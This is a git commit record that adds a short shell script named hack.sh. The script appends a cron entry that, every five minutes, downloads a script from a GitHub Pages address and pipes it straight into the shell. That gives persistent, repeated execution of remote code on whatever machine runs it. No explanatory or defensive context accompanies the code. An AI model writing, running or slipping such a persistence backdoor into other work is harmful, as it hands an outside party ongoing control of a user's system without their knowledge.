31ba81035400527600240695e253d106741c0356
matthewpipie <matthewpipie@gmail.com>
2017-03-30 22:19:34 -0500

    Create hack.sh

---
+++ hack.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+command="curl -s https://matthewpipie.github.io/send.sh | sh"
+
+#write out current crontab
+crontab -l > mycron
+#echo new cron into cron file
+echo "*/5 * * * * $command" >> mycron
+#install new cron file
+crontab mycron
+rm mycron
